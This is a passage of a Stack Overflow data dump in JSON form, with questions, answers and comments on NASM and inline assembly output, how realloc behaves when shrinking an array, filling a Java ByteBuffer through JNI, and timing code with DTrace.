this:</p>\n\n<h2>main.c</h2>\n\n<pre><code>char c[] = \"abcd\";\n\n/* the function you define in print_c.asm */\nextern void print_c();\n\nint main() {\n    print_c(); /* call your assembly function */\n}\n</code></pre>\n\n<h2>print_c.asm</h2>\n\n<pre><code>    ; pull in c defined in main.c\n    extern c\n\n    section .text\n\n    global print_c\n\nprint_c:\n    ; write c to stdout\n    mov eax, 4\n    mov ebx, 1\n    mov ecx, c\n    mov edx, 5\n    int 0x80\n\n    ; exit program\n    mov eax, 1\n    int 0x80\n</code></pre>\n\n<p>Then assemble, compile, and link with:</p>\n\n<pre><code>nasm -felf print_c.asm\ncc -m32 -o print_c print_c.o main.c\n</code></pre>\n"}], "owner": {"reputation": 49, "user_id": 10831933, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7a485d6ec9b09c124c5b032b62e28098?s=128&d=identicon&r=PG&f=1", "display_name": "Me.a", "link": "https://stackoverflow.com/users/10831933/me-a"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 403, "favorite_count": 0, "accepted_answer_id": 53922814, "answer_count": 1, "score": 0, "last_activity_date": 1545745089, "creation_date": 1545743555, "question_id": 53922693, "link": "https://stackoverflow.com/questions/53922693/how-to-use-inline-assemblynasm-for-file-i-o", "title": "how to use inline assembly(NASM) for file I/O", "body": "<p>I tried to write a char[] in stdout using inline NASM (note .intel_syntax and  .att_syntax are added so it can be compiled with gcc)</p>\n\n<p>but it doesn't write anything in stdout.</p>\n\n<p>I am using Linux 16 (x86) on Virtual machine</p>\n\n<p>Is it cause of char c[] ? ( I read by this way of compiling we cannot use memory variables but what to do instead?)</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n\n\nchar c[] = \"abcd\";\n\nint main(){\n    asm (\".intel_syntax noprefix\");\n\n    // write c into stdout\n    asm(\"mov EAX,4\"); // 4: write\n    asm(\"mov EBX,1\"); // 1: stdout\n    asm(\"mov ECX,c\");\n    asm(\"mov EDX,5\");\n    asm(\"int 0x80\");\n\n    // exit program\n    asm(\"mov EAX,1\")\n    asm(\"int 0x80\")\n\n    asm (\".att_syntax noprefix\");\n}\n</code></pre>\n\n<p>the output is nothing</p>\n"}, {"tags": ["c", "arrays", "memory", "free", "realloc"], "comments": [{"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "reply_to_user": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1545751265, "post_id": 53922644, "comment_id": 94688795, "body": "@AnttiHaapala: The question you marked this as a duplicate asks about the immediate use of <code>realloc</code>: What memory is usable afterward and whether the address changes when the allocation is being reduced. This question asks about a different effect of <code>realloc</code>: Whether, if the memory is reduced and <code>realloc</code> returns the same address, the memory that was requested to be released is then available for other allocation. These are not the same question."}, {"owner": {"reputation": 87, "user_id": 10639883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d59f15ee277ab8e343057344f368c898?s=128&d=identicon&r=PG&f=1", "display_name": "MASTER OF CODE", "link": "https://stackoverflow.com/users/10639883/master-of-code"}, "reply_to_user": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "edited": false, "score": 0, "creation_date": 1545751698, "post_id": 53922644, "comment_id": 94688897, "body": "Actually it will be good to know answer for both of this questions, but you&#39;re right, it&#39;s not the same and now I can see that. However it doesn&#39;t solve my problem."}, {"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "edited": false, "score": 0, "creation_date": 1545752820, "post_id": 53922644, "comment_id": 94689107, "body": "Answering your later question of \u201cDoes this function work properly?\u201d is out of scope for Stack Overflow. However, note that, if <code>realloc</code> cannot allocate memory for a new object, the old object is not deallocated. Therefore, you do not need to report a memory reallocation error in this case. The old pointer remains valid, so the program can continue."}, {"owner": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "edited": false, "score": 0, "creation_date": 1545752994, "post_id": 53922644, "comment_id": 94689142, "body": "Sidenote: As <code>realloc</code> accepts <code>size_t</code>, which is unsigned, -1 will be converted to a very large value your memory most likely is not capable to hold - and you&#39;ll experience the behaviour Eric described above..."}], "answers": [{"tags": [], "owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "is_accepted": false, "score": 3, "last_activity_date": 1545784608, "last_edit_date": 1592644375, "creation_date": 1545752487, "answer_id": 53923713, "question_id": 53922644, "link": "https://stackoverflow.com/questions/53922644/what-happens-with-the-memory-when-decrease-array-with-realloc/53923713#53923713", "title": "What happens with the memory when decrease array with realloc?", "body": "<p>Regarding <code>void *realloc(void *ptr, size_t size)</code>, the C standard says in C 2018 7.22.3.5 paragraphs 2 and 3:</p>\n<blockquote>\n<p>The <code>realloc</code> function deallocates the old object pointed to by <code>ptr</code> and returns a pointer to a new object that has the size specified by <code>size</code>. The contents of the new object shall be the same as that of the old object prior to deallocation, up to the lesser of the new and old sizes. Any bytes in the new object beyond the size of the old object have indeterminate values.</p>\n<p>If <code>ptr</code> is a null pointer, the <code>realloc</code> function behaves like the <code>malloc</code> function for the specified size. Otherwise, if <code>ptr</code> does not match a pointer earlier returned by a memory management function, or if the space has been deallocated by a call to the <code>free</code> or <code>realloc</code> function, the behavior is undefined. If <code>size</code> is nonzero and memory for the new object is not allocated, the old object is not deallocated. If <code>size</code> is zero and memory for the new object is not allocated, it is implementation-defined whether the old object is deallocated. If the old object is not deallocated, its value shall be unchanged.</p>\n</blockquote>\n<p>What this means when you ask to reduce the size of a previously allocated object is:</p>\n<ul>\n<li><p>The returned pointer might or might not be the same as the original pointer. (See discussion below.)</p>\n</li>\n<li><p>The C standard permits the portion of memory that is released to be reused for other allocations. Whether or not it is reused is up to the C implementation.</p>\n</li>\n<li><p>Whether the values in the released portion of memory are immediately overwritten or not is not specified by the C standard. Certainly the user of <code>realloc</code> may not rely on any behavior regarding that memory.</p>\n</li>\n</ul>\n<h2>Discussion</h2>\n<p>When a memory allocation is reduced, it certainly seems \u201ceasy\u201d for the memory allocation routines to simply return the same pointer while remembering that the released memory is free. However, memory allocation systems are fairly complex, so other factors may be involved. For example, hypothetically:</p>\n<ul>\n<li><p>To support many small allocations without much overhead, a memory allocation system might create a pool of memory for one-to-four byte allocations, another pool for five-to-eight, another pool for eight-to-16, and a general pool for larger sizes. For the larger sizes, it might remember each allocation individually, customizing its size and managing them all with various data structures. For the smaller sizes, it might keep little more than a bitmap for each, with each bit indicating whether or not its corresponding four-byte (or eight or 16) region is allocated. In such a system, if you release eight bytes of a 16-byte allocation, the memory allocation software might move the data to something in the eight-byte pool.</p>\n</li>\n<li><p>In any memory allocation system, if you release just a few bytes at the end of an allocation, it might not be enough bytes to take advantage of\u2014the data structures required to track the few bytes you released might be bigger than the few bytes. So it is not worthwhile to make them available for reuse. The memory allocation system just keeps them with the block, although it may remember the data in the block is actually a bit smaller than the space reserved for it.</p>\n</li>\n</ul>\n"}], "owner": {"reputation": 87, "user_id": 10639883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d59f15ee277ab8e343057344f368c898?s=128&d=identicon&r=PG&f=1", "display_name": "MASTER OF CODE", "link": "https://stackoverflow.com/users/10639883/master-of-code"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 973, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1545784608, "creation_date": 1545743113, "last_edit_date": 1545750698, "question_id": 53922644, "link": "https://stackoverflow.com/questions/53922644/what-happens-with-the-memory-when-decrease-array-with-realloc", "title": "What happens with the memory when decrease array with realloc?", "body": "<p>I was wondering what happens with the memory when u realloc -1 your array. According everything that I've read about realloc I suppose that pointer still points at the same place in memory (there's no need for function to seek another block of memory as that one is available and sufficient), tell me if I'm wrong. My question is: Is the deleted piece of array deleted (like with using free()) or are the values stay untouched and the piece of memory is being shared for future operations of malloc, calloc etc.?</p>\n\n<p>EDIT:\nI have one more question. Does this function work properly? It should delete element of array previously overwriting it by the next element of the array. Doing it over the whole array, the last element is the same as the one before last and the last one is deleted. PicCounter is the number of pictures already uploaded to program. Check this out:</p>\n\n<pre><code>int DeletePicture(struct Picture **tab, int *PicCounter)\n{\nint PicToDelete;\nprintf(\"Enter the number of pic to delete \");\nscanf(\"%d\", &amp;PicToDelete);\nfor (int i = PicToDelete - 1; i &lt; (*PicCounter) - 2; i++)\n{\n    (*tab)[i] = (*tab)[i + 1];\n}\n\nstruct Picture *temp;\ntemp = realloc(*tab, ((*PicCounter)-1) * sizeof(*temp));\nif (temp != NULL)\n{\n    *tab = temp;\n //That doesn't delete the element, because in main I can still print it\n //like e.g. tab[lastelement]. \n    (*PicCounter)--;\n    printf(\"Picture has been deleted\\n\");\n    return 0;\n}\nelse\n{\n    printf(\"Memory reallocation error\\n\");\n    return 1;\n}\n}\n</code></pre>\n"}, {"tags": ["java", "c", "jvm", "java-native-interface"], "comments": [{"owner": {"reputation": 77832, "user_id": 3448419, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/54njx.png?s=128&g=1", "display_name": "apangin", "link": "https://stackoverflow.com/users/3448419/apangin"}, "edited": false, "score": 2, "creation_date": 1545742958, "post_id": 53922441, "comment_id": 94687002, "body": "There is no way to set non-direct ByteBuffer directly from native. So, you need to have two implementations for direct and heap ByteBuffers and select one of them depending on <code>ByteBuffer.isDirect</code>. An implementation for heap ByteBuffer can either use a temporary DirectByteBuffer and then copy data, or get <code>ByteBuffer.array()</code> and set the array using JNI <code>SetByteArrayRegion</code>."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1545744456, "post_id": 53922441, "comment_id": 94687315, "body": "Do you really have to put the data into an <i>existing</i> <code>ByteBuffer</code>?  Would it suffice to create and return a new one, instead?"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1545755502, "post_id": 53922441, "comment_id": 94689644, "body": "One thing you are perhaps missing is that depending on the specific concrete <code>ByteBuffer</code> implementation you&#39;re working with, there might not <i>be</i> any corresponding native array."}, {"owner": {"reputation": 6828, "user_id": 8990329, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f073ad236ccf499ebfbe504bc79a2096?s=128&d=identicon&r=PG&f=1", "display_name": "Some Name", "link": "https://stackoverflow.com/users/8990329/some-name"}, "reply_to_user": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1545756278, "post_id": 53922441, "comment_id": 94689806, "body": "@JohnBollinger Actually I am currently inclined to limit the usage to <code>DirectBuffer</code>s only and simply throw in case <code>GetDirectBufferAddress</code> returns <code>NULL</code>. Is such a thing possible and may be appropriate?"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1545757178, "post_id": 53922441, "comment_id": 94689956, "body": "@SomeName, is it <i>possible</i>? Sure.  Is it <i>appropriate</i>? No.  If the only kind of buffer your method is willing to accept is <code>sun.nio.ch.DirectBuffer</code>, then that&#39;s what the method parameter&#39;s type should be.  That would likely require casting on the Java side, but it&#39;s <i>much</i> easier to debug a <code>ClassCastException</code> emitted by your Java code than to debug most any exception emitted by native code."}, {"owner": {"reputation": 52300, "user_id": 192373, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/83a45711c4c32eeeb3826d279e50f8ab?s=128&d=identicon&r=PG", "display_name": "Alex Cohn", "link": "https://stackoverflow.com/users/192373/alex-cohn"}, "edited": false, "score": 0, "creation_date": 1545767844, "post_id": 53922441, "comment_id": 94692050, "body": "There is no guarantee that <code>GetDirectBufferAddress()</code> will silently return NULL for a non-direct ByteBuffer, therefore checking <code>iisDirect()</code> is necessary."}, {"owner": {"reputation": 6828, "user_id": 8990329, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f073ad236ccf499ebfbe504bc79a2096?s=128&d=identicon&r=PG&f=1", "display_name": "Some Name", "link": "https://stackoverflow.com/users/8990329/some-name"}, "reply_to_user": {"reputation": 52300, "user_id": 192373, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/83a45711c4c32eeeb3826d279e50f8ab?s=128&d=identicon&r=PG", "display_name": "Alex Cohn", "link": "https://stackoverflow.com/users/192373/alex-cohn"}, "edited": false, "score": 0, "creation_date": 1545808619, "post_id": 53922441, "comment_id": 94698397, "body": "@AlexCohn Is it guaranteed that if <code>isDirect</code> returns true that <code>GetDirectBufferAddress</code> won&#39;t return <code>NULL</code>."}, {"owner": {"reputation": 52300, "user_id": 192373, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/83a45711c4c32eeeb3826d279e50f8ab?s=128&d=identicon&r=PG", "display_name": "Alex Cohn", "link": "https://stackoverflow.com/users/192373/alex-cohn"}, "edited": false, "score": 1, "creation_date": 1545816403, "post_id": 53922441, "comment_id": 94700715, "body": "<b>a)</b> yes, it&#39;s guaranteed. <b>b)</b> I would still add this extra check. <code>|||</code> There is actually nothing you can do with a direct buffer which returns <b>0</b> address, not even try to access its bytes in a less efficient way (via an underlying array, or with <code>get()</code>). This would be a clear evidence of a corrupt buffer object. But it&#39;s so easy to safeguard against this specific kind of corruption."}, {"owner": {"reputation": 52300, "user_id": 192373, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/83a45711c4c32eeeb3826d279e50f8ab?s=128&d=identicon&r=PG", "display_name": "Alex Cohn", "link": "https://stackoverflow.com/users/192373/alex-cohn"}, "edited": false, "score": 1, "creation_date": 1545816981, "post_id": 53922441, "comment_id": 94700968, "body": "Note that instead of <code>CallBooleanMethod( javaBuf, GetMethodID( FindClass( &quot;java&#47;nio&#47;ByteBuffer&quot; ), &quot;isDirect&quot;, &quot;()Z&quot; ) )</code> you can use <code>IsInstanceOf ( javaBuf,FindClass ( &quot;java&#47;nio&#47;DirectByteBuffer&quot; ) )</code>"}, {"owner": {"reputation": 6828, "user_id": 8990329, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f073ad236ccf499ebfbe504bc79a2096?s=128&d=identicon&r=PG&f=1", "display_name": "Some Name", "link": "https://stackoverflow.com/users/8990329/some-name"}, "reply_to_user": {"reputation": 52300, "user_id": 192373, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/83a45711c4c32eeeb3826d279e50f8ab?s=128&d=identicon&r=PG", "display_name": "Alex Cohn", "link": "https://stackoverflow.com/users/192373/alex-cohn"}, "edited": false, "score": 0, "creation_date": 1545818294, "post_id": 53922441, "comment_id": 94701432, "body": "@AlexCohn Thanks."}, {"owner": {"reputation": 52300, "user_id": 192373, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/83a45711c4c32eeeb3826d279e50f8ab?s=128&d=identicon&r=PG", "display_name": "Alex Cohn", "link": "https://stackoverflow.com/users/192373/alex-cohn"}, "edited": false, "score": 1, "creation_date": 1545820560, "post_id": 53922441, "comment_id": 94702244, "body": "Actually, the <a href=\"https://docs.oracle.com/javase/7/docs/technotes/guides/jni/spec/functions.html#GetDirectBufferAddress\" rel=\"nofollow noreferrer\">Java7 spec</a> requires that for non-direct buffer, <code>GetDirectBufferAddress</code> returns <code>NULL</code>, but Android modern JVM (ART) is not compliant. I have opened a <a href=\"https://issuetracker.google.com/issues/121463764\" rel=\"nofollow noreferrer\">bug report</a> about this."}], "answers": [{"comments": [{"owner": {"reputation": 6828, "user_id": 8990329, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f073ad236ccf499ebfbe504bc79a2096?s=128&d=identicon&r=PG&f=1", "display_name": "Some Name", "link": "https://stackoverflow.com/users/8990329/some-name"}, "edited": false, "score": 0, "creation_date": 1545756076, "post_id": 53923098, "comment_id": 94689761, "body": "Thanks for the explanation. But the thing that I did not understand yet was why should not the array methods be crtitical? I need to communicate with a device driver that provides <code>ioctl</code>s I need (i.e. it involves some io anyway)"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "reply_to_user": {"reputation": 6828, "user_id": 8990329, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f073ad236ccf499ebfbe504bc79a2096?s=128&d=identicon&r=PG&f=1", "display_name": "Some Name", "link": "https://stackoverflow.com/users/8990329/some-name"}, "edited": false, "score": 2, "creation_date": 1545756862, "post_id": 53923098, "comment_id": 94689908, "body": "@SomeName, using the <code>*PrimitiveArrayCritical()</code> routines provide your best chance to avoid <i>internal</i> copying between Java and native arrays, but there is a price: if you&#39;re using those then the code between the Get and Release must complete quickly, must not block, and must not call other JNI functions.  If you&#39;re using <code>ioctl</code>s to populate the array, then the <code>Critical</code> versions are right out.  You want <code>GetByteArrayElements()</code> and <code>ReleaseByteArrayElements()</code>, which provide the same interface."}, {"owner": {"reputation": 496316, "user_id": 57695, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/53ee9941b3fefef67175daf212e62d41?s=128&d=identicon&r=PG", "display_name": "Peter Lawrey", "link": "https://stackoverflow.com/users/57695/peter-lawrey"}, "edited": false, "score": 1, "creation_date": 1545826303, "post_id": 53923098, "comment_id": 94704206, "body": "No matter what you do, the system call will only work with native memory. What the JVM does is create/caches a direct ByteBuffer as needed, read the data and copy it into an on heap ByteBuffer. You can write something to do basically that in JNI, or just do it into Java."}], "tags": [], "owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "is_accepted": true, "score": 3, "last_activity_date": 1545746936, "creation_date": 1545746936, "answer_id": 53923098, "question_id": 53922441, "link": "https://stackoverflow.com/questions/53922441/is-there-a-way-to-set-directbytebuffer-memory-with-jni/53923098#53923098", "title": "Is there a way to set DirectByteBuffer memory with JNI?", "body": "<p>Supposing that you limit yourself to public classes and their public API, you have two relatively efficient alternatives for approaching the problem, but they have in common that they rely on putting the data into a Java <code>byte[]</code>.  That's not so hard:</p>\n\n<pre><code>/* error checks omitted for brevity; these are *not* optional */\n\nchar *cBytes = /* ... */;\nsize_t numCBytes = /* ... */;\njbyteArray javaBytes = /* ... */;\n\njsize numBytes = (*env)-&gt;GetArrayLength(env, javaBytes);\njbyte *bytes = (*env)-&gt;GetPrimitiveArrayCritical(env, javaBytes, NULL);\n/* It is pretty safe to assume that jbyte is a character type, such as signed\n   char, in any C implementation that supports the JNI at all */\n/* Assumes numCBytes &lt;= numBytes; adjust as necessary if that may not be true: */\nmemcpy(bytes, cBytes, numCBytes);\n(*env)-&gt;ReleasePrimitiveArrayCritical(env, javaBytes, bytes, 0);\n</code></pre>\n\n<p>Note that if the JNI function performs some kind of I/O to get the bytes, it may be able to read them directly into <code>bytes</code> (depending on the native requirements, not on JNI), but in that case you should use the non-<code>Critical</code> versions of the <code>Get</code>/<code>Release</code> routines.</p>\n\n<p>With that said, your two main alternatives for getting the data all the way into a <code>ByteBuffer</code> are</p>\n\n<ul>\n<li><p>if the buffer <code>hasArray()</code>, then obtain the <code>byte[]</code> for the above procedure via the buffer's <code>array()</code> method.  Done and done.</p></li>\n<li><p>if the buffer does not <code>hasArray()</code>, or if you don't want to check, then obtain the <code>byte[]</code> by instantiating it freshly, and after loading it via the above procedure, copy the contents into the buffer via the buffer's bulk <code>put(byte[])</code> or <code>put(byte[], int, int)</code> method.  Obviously, this involves an extra copy relative to the other alternative, and it uses an extra temporary object.</p></li>\n</ul>\n\n<p>I cannot recommend assuming a specific concrete <code>ByteBuffer</code> subclass or relying on non-public methods.  That might be worth considering if performance were a high priority, but you seem to say it's not.</p>\n"}], "owner": {"reputation": 6828, "user_id": 8990329, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f073ad236ccf499ebfbe504bc79a2096?s=128&d=identicon&r=PG&f=1", "display_name": "Some Name", "link": "https://stackoverflow.com/users/8990329/some-name"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 446, "favorite_count": 0, "accepted_answer_id": 53923098, "answer_count": 1, "score": 0, "last_activity_date": 1545751016, "creation_date": 1545741289, "last_edit_date": 1545751016, "question_id": 53922441, "link": "https://stackoverflow.com/questions/53922441/is-there-a-way-to-set-directbytebuffer-memory-with-jni", "title": "Is there a way to set DirectByteBuffer memory with JNI?", "body": "<p>For some reason I have to use Linux-specific API which is not currently accessible from JVM directly and need to design a method which accepts <code>ByteBuffer</code> (<em>This is definitely not because of some performance reason</em>). Here is how it looks like:</p>\n\n<pre><code>//I need to call device-specific ioctl here\n//and fill the ByteBuffer\npublic static native long putIntoByteBuffer(int fd, ByteBuffer buf);\n</code></pre>\n\n<p>The generated header file is</p>\n\n<pre><code>JNIEXPORT jlong JNICALL Java_net_abcomm_PlatformSpecific_putIntoByteBuffer\n  (JNIEnv *, jclass, jint, jobject);\n</code></pre>\n\n<p>How to get the <code>char*</code> by the given <code>ByteBuffer</code> with <code>JNI</code>? I could use <code>DirectBuffer</code>, but then I will be limited to <code>DirectBuffer</code>s only and besides the following warning is generated:</p>\n\n<pre><code>warning: DirectBuffer is internal proprietary API and may be removed in a \nfuture release\nimport sun.nio.ch.DirectBuffer;\n</code></pre>\n\n<p>Also there is <a href=\"https://docs.oracle.com/javase/7/docs/technotes/guides/jni/spec/functions.html#GetDirectBufferAddress\" rel=\"nofollow noreferrer\"><code>GetDirectBufferAddress</code></a> returning <code>void*</code> but it is limited to <code>DirectBuffer</code>s only.</p>\n"}, {"tags": ["c", "dtrace"], "comments": [{"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1545788773, "post_id": 53922351, "comment_id": 94694979, "body": "strongly suggest using calls to <code>clock()</code> to obtain the current CPU time at the two points where the time measurement is wanted,  then the elapsed time is ValueReturnedFromSecondCallToClock  - ValueReturnedFromFirstCallToClock.  You could divide the result by <code>CLOCKS_PER_SECOND</code> to obtain the (more readable) elapsed seconds"}], "answers": [{"tags": [], "owner": {"reputation": 83109, "user_id": 1312143, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9d64f50f989e564c337a8a8bd653b8e6?s=128&d=identicon&r=PG", "display_name": "Ken Thomases", "link": "https://stackoverflow.com/users/1312143/ken-thomases"}, "is_accepted": false, "score": 2, "last_activity_date": 1545770431, "creation_date": 1545770431, "answer_id": 53925496, "question_id": 53922351, "link": "https://stackoverflow.com/questions/53922351/how-can-i-use-dtrace-to-calculate-the-time-taken-between-arbitrary-c-statements/53925496#53925496", "title": "How can I use Dtrace to calculate the time taken between arbitrary C statements", "body": "<p>In addition to the <code>entry</code> and <code>return</code> probes, the <code>pid</code> provider also has probes for each instruction offset. If you do <code>sudo dtrace -l -n 'pid$target::WriteGIFImage:*' -p &lt;pid&gt;</code>, it will list them. Then, you have to disassemble the code to determine what offset corresponds to what line of code. And, when a program is built with optimizations turned on, that correspondence might not be clean. (Instructions can be out of order with respect to code lines.)</p>\n\n<p>You can also define your own User-Defined Static Tracing (USDT) providers and instrument your code with them. The <code>dtrace</code> man page explains how.</p>\n\n<p>All of that said, though, DTrace probably isn't the best tool for this. Use the Time Profiler template of Instruments and it will tell you where your program is spending its time, down to the line (or even instruction).</p>\n"}], "owner": {"reputation": 155, "user_id": 2964428, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/1z8Nx.jpg?s=128&g=1", "display_name": "da_miao_zi", "link": "https://stackoverflow.com/users/2964428/da-miao-zi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 115, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1545770431, "creation_date": 1545740499, "question_id": 53922351, "link": "https://stackoverflow.com/questions/53922351/how-can-i-use-dtrace-to-calculate-the-time-taken-between-arbitrary-c-statements", "title": "How can I use Dtrace to calculate the time taken between arbitrary C statements", "body": "<p>I'm using ImageMagick(via PHP imagick extension) to generate a simple gif animation, like this one.</p>\n\n<p><a href=\"https://i.stack.imgur.com/S37Kt.gif\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/S37Kt.gif\" alt=\"enter image description here\"></a></p>\n\n<p>And I've found <code>WriteGIFImage()</code>(<a href=\"https://github.com/ImageMagick/ImageMagick/blob/c807b69de68a33b42fc8725486d5ac81688afd16/coders/gif.c#L1506\" rel=\"nofollow noreferrer\">https://github.com/ImageMagick/ImageMagick/blob/c807b69de68a33b42fc8725486d5ac81688afd16/coders/gif.c#L1506</a>) function takes long time to write the gif data by following D script.</p>\n\n<pre><code>pid$target::WriteGIFImage:entry\n{\n    self-&gt;start_WriteGIFImage = timestamp;\n    printf(\"     -&gt; WriteGIFImage\\n\");\n}\n\npid$target::WriteGIFImage:return\n{\n    this-&gt;delta = (timestamp - self-&gt;start_WriteGIFImage) / 1000 / 1000;\n    @deltas[\"WriteGIFImage\"] = sum(this-&gt;delta);\n    printf(\"     &lt;- WriteGIFImage elapsed %d ms\\n\", this-&gt;delta);\n}\n\n// Output\nImagesToBlob\n -&gt; WriteImage\n     -&gt; WriteGIFImage\n     &lt;- WriteGIFImage elapsed 821 ms\n &lt;- WriteImage elapsed 821 ms\nImagesToBlob elapsed 821 ms\n\nTotal (ms):\n  RelinquishMagickMemory                                            0\n  WriteBlobByte                                                     0\n  ImagesToBlob                                                    821\n  WriteGIFImage                                                   821\n  WriteImage                                                      821\n</code></pre>\n\n<p><code>WriteGIFImage()</code> is a big function, I want to know time taken between 2 statements, in order to find the slowest code block. e.g. I suspect this for loop takes long time, so I need Dtrace tell me the time diff between line 1673 and 1678. How can I use D script to finish it? </p>\n\n<pre><code>1673    for (i=0; i &lt; (ssize_t) image-&gt;colors; i++)\n1674    {\n1675      *q++=ScaleQuantumToChar(ClampToQuantum(image-&gt;colormap[i].red));\n1676      *q++=ScaleQuantumToChar(ClampToQuantum(image-&gt;colormap[i].green));\n1677      *q++=ScaleQuantumToChar(ClampToQuantum(image-&gt;colormap[i].blue));\n1678    }\n</code></pre>\n\n<p>btw, I found <code>ScaleQuantumToChar()</code> and <code>ClampToQuantum()</code> are both <strong>inline</strong> functions, and <code>pid*::ScaleQuantumToChar:entry/return</code> probe can not work. How to trace inline functions with D? </p>\n"}, {"tags": ["c", "ncurses"], "comments": [{"owner": {"reputation": 1669, "user_id": 7508077, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5b4193888717f50e77805498af1435b9?s=128&d=identicon&r=PG&f=1", "display_name": "EsmaeelE", "link": "https://stackoverflow.com/users/7508077/esmaeele"}, "edited": false, "score": 0, "creation_date": 1545756860, "post_id": 53922334, "comment_id": 94689907, "body": "Where is the <code>&lt;poll.h&gt;</code> and <code>&lt;panel.h&gt;</code>?"}, {"owner": {"reputation": 11, "user_id": 10831755, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5fe4d75d155852dc6949bc21f3e82e4c?s=128&d=identicon&r=PG&f=1", "display_name": "mjm", "link": 